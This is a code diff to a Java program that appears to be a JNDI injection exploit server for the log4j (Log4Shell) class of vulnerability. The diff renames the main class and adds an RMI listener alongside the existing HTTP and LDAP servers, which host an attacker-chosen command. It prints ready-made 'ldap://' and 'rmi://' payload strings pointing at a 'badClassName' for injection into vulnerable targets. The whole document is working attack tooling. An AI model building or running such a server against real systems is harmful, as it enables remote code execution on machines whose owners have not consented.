@@ -1,10 +1,11 @@
 package org.sec;
 
-import org.apache.log4j.LogManager;
-import org.apache.log4j.Logger;
 
-public class Main {
-    private static final Logger logger = LogManager.getLogger(Main.class);
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class ServerMain {
+    private static final Logger logger = LogManager.getLogger(ServerMain.class);
 
     public static void main(String[] args) {
         try {
@@ -19,9 +20,12 @@ public class Main {
             logger.info("cmd: " + cmd);
             new Thread(() -> Http.start(cmd)).start();
             new Thread(Ldap::start).start();
+            new Thread(RMI::start).start();
+
             Thread.sleep(1000);
             System.out.println("|--------------------------------------------------------|");
             System.out.println("|------Payload: ldap://127.0.0.1:1389/badClassName-------|");
+            System.out.println("|------Payload: rmi://127.0.0.1:1099/badClassName-------|");
             System.out.println("|--------------------------------------------------------|");
         } catch (Exception e) {
             logger.error(e.getMessage());
